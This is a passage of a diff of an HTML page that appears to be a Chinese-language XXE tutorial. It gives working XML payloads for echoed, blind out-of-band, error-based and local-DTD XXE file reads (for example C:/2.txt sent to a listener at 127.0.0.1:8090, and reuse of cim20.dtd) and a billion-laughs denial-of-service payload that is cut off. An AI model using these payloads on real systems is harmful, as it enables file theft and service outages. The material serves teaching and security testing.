-&lt;!ENTITY % x SYSTEM "http://127.0.0.1:8090/note.dtd"&gt;</span>
+&lt;!ENTITY % x SYSTEM "http://127.0.0.1:8090/note.dtd"></span>
 %x;
-]&gt;
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">&gt;</span></span><span class="token entity" title="&amp;p;">&amp;p;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span><span class="token entity" title="&p;">&amp;p;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>外部DTD中参数实体data获取C:\2.txt文件内容，实体p定义为 <code>%data;</code> 的值：</p>
-<pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % data SYSTEM "file:///c://2.txt"&gt; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">p</span> <span class="token attr-name">"%data;"</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % data SYSTEM "file:///c://2.txt"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">p</span> <span class="token attr-name">"%data;"</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>通过评论区的回显内容可以看到，成功读取到了C:\2.txt的文件内容。<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/8216a4fbd64dc4440bf4bbcb699311ef.png"></p>
 <h4 id="XXE盲注"><a href="#XXE盲注" class="headerlink" title="XXE盲注"></a>XXE盲注</h4><p>有时候没有办法获得回显信息(这里的测试环境会回显错误信息，假装看不见)，可以尝试利用带外数据(Out of Band, OOB)进行利用(或者利用一些延时、错误状态码等判断)，也就是盲XXE的利用，继续修改上一步的payload，首先发起的XML载荷中定义了两个参数实体，data 值是文件C:\2.txt的内容，param3 值的内容是远程文件note.dtd，然后引用参数实体param3：</p>
-<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?&gt;</span>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
 <span class="token doctype">&lt;!DOCTYPE root \[
-    &lt;!ENTITY % data SYSTEM "file:///c:/2.txt"&gt;</span>
-    &lt;!ENTITY % param3 SYSTEM "http://127.0.0.1:8090/note.dtd"&gt;
+    &lt;!ENTITY % data SYSTEM "file:///c:/2.txt"></span>
+    &lt;!ENTITY % param3 SYSTEM "http://127.0.0.1:8090/note.dtd">
     %param3;
-\]&gt;
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">&gt;</span></span><span class="token entity" title="&amp;text;">&amp;text;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+\]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span><span class="token entity" title="&text;">&amp;text;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>引用后会先到 <a target="_blank" rel="noopener" href="http://127.0.0.1:8090/note.dtd">http://127.0.0.1:8090/note.dtd</a> 加载note.dtd，在参数实体的理解中已经知道解析的过程了，引用p后定义send、解析data的值，然后引用send，带着text的值发起远程dtd请求，将数据带出：</p>
-<pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % p "&lt;!ENTITY <span class="token entity" title="%">&amp;#x25;</span> send SYSTEM 'http://127.0.0.1:8090/2.dtd?text=%data;'&gt;"&gt; %p;%send;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % p "&lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> send SYSTEM 'http://127.0.0.1:8090/2.dtd?text=%data;'>"> %p;%send;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>发送POC后，成功获取到带外数据：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/034526faa3470a0d2171a588f59cadea.png"><br>上面是利用参数实体获取文件内容后，请求外部实体时将数据参数发送到服务器。但是如果文件内容存在多行时，会出现错误<code>ParseError at xx Message: Illegal character in URL</code>：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/00072e3176412e10667471f6ed1a0c23.png"><br>参考了一些文章<a target="_blank" rel="noopener" href="https://landgrey.me/blog/9/">Java xxe oob 读取多行文件失败的原因</a>，发现是在JDK中做了限制，数据带外在文件中存在一些如<code>%，&amp;</code>等特殊字符时也会抛出异常，一些协议(gopher)也在高版本中无法使用。所以说XXE能否深入利用还得看JDK的版本。在测试该类型XXE时，可以使用服务工具<a target="_blank" rel="noopener" href="https://github.com/TheTwitchy/xxer">XXER</a>，可以开启HTTP和FTP服务获取带外数据：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/2a333431c3588ae423f9988970e2c358.png"></p>
 <h4 id="XXE报错注入"><a href="#XXE报错注入" class="headerlink" title="XXE报错注入"></a>XXE报错注入</h4><p>利用XML解析过程中访问不到远程DTD文件返回404造成报错，错误信息中将包含文件内容:</p>
-<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?&gt;</span>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
 <span class="token doctype">&lt;!DOCTYPE r [
-&lt;!ENTITY % data3 SYSTEM "file:///c://2.txt"&gt;</span>
-&lt;!ENTITY % sp SYSTEM "http://127.0.0.1:8090/note.dtd"&gt;
+&lt;!ENTITY % data3 SYSTEM "file:///c://2.txt"></span>
+&lt;!ENTITY % sp SYSTEM "http://127.0.0.1:8090/note.dtd">
 %sp;
 %param3;
 %exfil;
-]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+]><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>web服务器上8090端口托管的note.dtd:</p>
-<pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % param3 "&lt;!ENTITY % exfil SYSTEM 'http://127.0.0.1:8090/txt=%data3;'&gt;"&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % param3 "&lt;!ENTITY % exfil SYSTEM 'http://127.0.0.1:8090/txt=%data3;'>"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>可以看到一边用带外收到了文件内容，一边也在错误信息中回显了，这里的报错是因为加载远程的dtd文件后xml进行解析，我们要读取的文件不符号dtd的格式要求，就抛出了错误：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/e5d84ad4a653b1be54531ceb0a43e0c6.png"><br>一般的都可以使用找不到文件的错误来进行回显：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/49180cc60c3717718fde88bc968f58e8.png"><br>用协议不存在报错读取多行包含<code>:</code>的文件：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/096aa525d9a94d7a11b1dca3032318f5.png"></p>
 <p><em>本地DTD利用</em><br>在某些情况下，漏洞点支持XML外部实体但是不直接回显数据，在这种情况下选择数据带外和报错回显的方式来利用，但是如果目标系统存在防火墙限制就不能使用数据带外，在报错注入中用到的外部DTD是这样的:</p>
-<pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % param3 "&lt;!ENTITY % exfil SYSTEM 'http://127.0.0.1:8090/txt=%data3;'&gt;"&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % param3 "&lt;!ENTITY % exfil SYSTEM 'http://127.0.0.1:8090/txt=%data3;'>"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>在参数实体类型中，不能在DOCTYPE中用实体中包含一个实体，会抛出异常<code>参数实体引用 xxx, 不能出现在 DTD 的内部子集中的标记内</code>。这时可以通过加载一些本地DTD，通过重定义本地DTD中的实体值进行利用。主要原理是XML在使用实体时，如果两个实体名称相同，则仅使用第一个实体。这样就可以在XML内部对实体进行重新定义然后利用本地DTD来进行参数实体解析，例如在服务器本地存在如下FIle0.dtd文件:</p>
-<pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">condition</span> <span class="token attr-name">"and</span> <span class="token attr-name">|</span> <span class="token attr-name">or</span> <span class="token attr-name">|</span> <span class="token attr-name">not</span> <span class="token attr-name">|</span> <span class="token attr-name">equal</span> <span class="token attr-name">|</span> <span class="token attr-name">contains</span> <span class="token attr-name">|</span> <span class="token attr-name">exists</span> <span class="token attr-name">|</span> <span class="token attr-name">subdomain-of"</span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">pattern</span> <span class="token attr-name">(%condition;)</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">condition</span> <span class="token attr-name">"and</span> <span class="token attr-name">|</span> <span class="token attr-name">or</span> <span class="token attr-name">|</span> <span class="token attr-name">not</span> <span class="token attr-name">|</span> <span class="token attr-name">equal</span> <span class="token attr-name">|</span> <span class="token attr-name">contains</span> <span class="token attr-name">|</span> <span class="token attr-name">exists</span> <span class="token attr-name">|</span> <span class="token attr-name">subdomain-of"</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">pattern</span> <span class="token attr-name">(%condition;)</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>FIle0.dtd文件中有一个condition参数实体，然后在下面ELEMENT标签中对参数实体进行引用定义为pattern的元素。 那么在poc中利用如下，引用FIle0.dtd文件后，重定义参数实体condition ：</p>
-<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?&gt;</span>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
 <span class="token doctype">&lt;!DOCTYPE root [
-&lt;!ENTITY % x SYSTEM "file:///C:\\FIle0.dtd"&gt;</span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">condition</span> <span class="token attr-name">'aaa)</span><span class="token punctuation">&gt;</span></span>
-       &lt;!ENTITY <span class="token entity" title="%">&amp;#x25;</span> file SYSTEM "file:///C:/2.txt"&gt;
-       &lt;!ENTITY <span class="token entity" title="%">&amp;#x25;</span> eval "&lt;!ENTITY <span class="token entity" title="&amp;">&amp;#x26;</span>#x25; error SYSTEM <span class="token entity" title="'">&amp;#x27;</span>file:///21.txt/<span class="token entity" title="%">&amp;#x25;</span>file;<span class="token entity" title="'">&amp;#x27;</span>&gt;"&gt;
-       <span class="token entity" title="%">&amp;#x25;</span>eval;
-       <span class="token entity" title="%">&amp;#x25;</span>error;
-       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">aa(bb'</span><span class="token punctuation">&gt;</span></span>
+&lt;!ENTITY % x SYSTEM "file:///C:\\FIle0.dtd"></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">condition</span> <span class="token attr-name">'aaa)</span><span class="token punctuation">></span></span>
+       &lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> file SYSTEM "file:///C:/2.txt">
+       &lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> eval "&lt;!ENTITY <span class="token entity" title="&#x26;">&amp;#x26;</span>#x25; error SYSTEM <span class="token entity" title="&#x27;">&amp;#x27;</span>file:///21.txt/<span class="token entity" title="&#x25;">&amp;#x25;</span>file;<span class="token entity" title="&#x27;">&amp;#x27;</span>>">
+       <span class="token entity" title="&#x25;">&amp;#x25;</span>eval;
+       <span class="token entity" title="&#x25;">&amp;#x25;</span>error;
+       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">aa(bb'</span><span class="token punctuation">></span></span>
 %x;
-]&gt;
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">&gt;</span></span>123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span>123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>发送POC后成功通过报错回显获得文件内容：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/71d6e54319b4502aabf0fccc9770f2d0.png"><br>分析POC，其中定义了condition，在%x解析后，File0.dtd的内容其实是在新定义的condition顺序之后，condition会被劫持为我们定义的内容，如下测试可以看到先定义的效果：</p>
-<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?&gt;</span>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
 <span class="token doctype">&lt;!DOCTYPE a [
-&lt;!ENTITY b "aaaaaaaaa"&gt;</span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">b</span> <span class="token attr-name">"bbbbbbbbb"</span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">b</span> <span class="token attr-name">"ccccccccc"</span><span class="token punctuation">&gt;</span></span>
-]&gt;
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">&gt;</span></span><span class="token entity" title="&amp;b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&lt;!ENTITY b "aaaaaaaaa"></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">b</span> <span class="token attr-name">"bbbbbbbbb"</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">b</span> <span class="token attr-name">"ccccccccc"</span><span class="token punctuation">></span></span>
+]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span><span class="token entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/ee0a5b720dcfb6e65a98282c0436d722.png"><br>我们知道实体就是参数值的引用，就等于把condition的内容放到dtd中，引入时会自动解析一次编码，所以在FIle0.dtd被解析后的XML内部的结果如下:</p>
-<pre class="line-numbers language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!-- &lt;!ENTITY % condition "and | or | not | equal | contains | exists | subdomain-of"&gt;  --&gt;</span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">pattern</span> <span class="token attr-name">(</span> <span class="token attr-name">aaa)</span><span class="token punctuation">&gt;</span></span>
-&lt;!ENTITY % file SYSTEM "file:///C:/2.txt"&gt;
-&lt;!ENTITY % eval "&lt;!ENTITY % error SYSTEM 'file:///21.txt/%file;'&gt;"&gt;
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!-- &lt;!ENTITY % condition "and | or | not | equal | contains | exists | subdomain-of">  --></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">pattern</span> <span class="token attr-name">(</span> <span class="token attr-name">aaa)</span><span class="token punctuation">></span></span>
+&lt;!ENTITY % file SYSTEM "file:///C:/2.txt">
+&lt;!ENTITY % eval "&lt;!ENTITY % error SYSTEM 'file:///21.txt/%file;'>">
  %eval;
  %error;
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">aa(bb)</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">aa(bb)</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这样一来先用 <code>aaa)&gt;</code>闭合之前的标签，然后再引入新的参数实体，最后使用<code>&lt;!ENTITY aa(bb</code>闭合末尾标签，结合起来就跟使用外部实体一样的了，在xml中的定义是一个字符串，符号实体编码会在引用时自动解码，所以单引号转为了<code>&amp;#x27;</code>；百分号转为了<code>&amp;#x26;#x25;</code>，解码一次后还原为<code>&amp;#x25;</code>，再次引用时就还原到参数实体的<code>%</code>了 。</p>
 <p>如何查找这些可利用的本地DTD?在<a target="_blank" rel="noopener" href="https://github.com/GoSecure/dtd-finder/releases/download/1.1/dtd-finder-1.1-all.jar">github</a>上有一个可利用的工具，使用<code>java -jar dtd-finder-1.1-all.jar xxx.jar</code>，这里找了一个jboss的安装包进行扫描，存在一个可利用的dtd：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/a9a6529ca3ee485264b707ebab29cd85.png"><br>POC中加上jar协议读取压缩文件，直接在错误中获得文件内容回显:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/e6a6654f51a2bfb619625872f492667f.png"></p>
 <p>windows中默认存在一个可利用的dtd<code>C:\Windows\System32\wbem\xml\cim20.dtd</code>：</p>
-<pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd"&gt;
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">SuperClass</span> <span class="token attr-name">'</span><span class="token punctuation">&gt;</span></span>Your DTD code<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">test</span> <span class="token attr-name">"test"'</span><span class="token punctuation">&gt;</span></span>
+<pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">SuperClass</span> <span class="token attr-name">'</span><span class="token punctuation">></span></span>Your DTD code<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">test</span> <span class="token attr-name">"test"'</span><span class="token punctuation">></span></span>
 %local_dtd;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>当然了，将这个<code>C:\Windows\System32\wbem\xml</code>打包成zip，使用工具扫描一波：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/7acd2861395e2d3a100e2a52e5c995e6.png"><br>直接利用：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/04272bda476d76d7dc71418119586f76.png"></p>
 <h4 id="XXE-DOS"><a href="#XXE-DOS" class="headerlink" title="XXE DOS"></a>XXE DOS</h4><p>一个多重实体嵌套的例子：</p>
-<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?&gt;</span>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
 <span class="token doctype">&lt;!DOCTYPE lolz [
- &lt;!ENTITY lol "lol"&gt;</span>
- <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">lolz</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">&gt;</span></span>
- <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol1</span> <span class="token attr-name">"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"</span><span class="token punctuation">&gt;</span></span>
- <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol2</span> <span class="token attr-name">"&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"</span><span class="token punctuation">&gt;</span></span>
- <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol3</span> <span class="token attr-name">"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"</span><span class="token punctuation">&gt;</span></span>
- <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol4</span> <span class="token attr-name">"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"</span><span class="token punctuation">&gt;</span></span>
- <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol5</span> <span class="token attr-name">"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"</span><span class="token punctuation">&gt;</span></span>
- <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol6</span> <span class="token attr-name">"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"</span><span class="token punctuation">&gt;</span></span>
- <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol7</span> <span class="token attr-name">"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"</span><span class="token punctuation">&gt;</span></span>
- <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol8</span> <span class="token attr-name">"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"</span><span class="token punctuation">&gt;</span></span>
- <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol9</span> <span class="token attr-name">"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"</span><span class="token punctuation">&gt;</span></span>
-]&gt;
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lolz</span><span class="token punctuation">&gt;</span></span><span class="token entity" title="&amp;lol9;">&amp;lol9;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lolz</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+ &lt;!ENTITY lol "lol"></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">lolz</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol1</span> <span class="token attr-name">"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol2</span> <span class="token attr-name">"&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol3</span> <span class="token attr-name">"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol4</span> <span class="token attr-name">"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol5</span> <span class="token attr-name">"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol6</span> <span class="token attr-name">"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"</span><span class="token punctuation">></span></span>
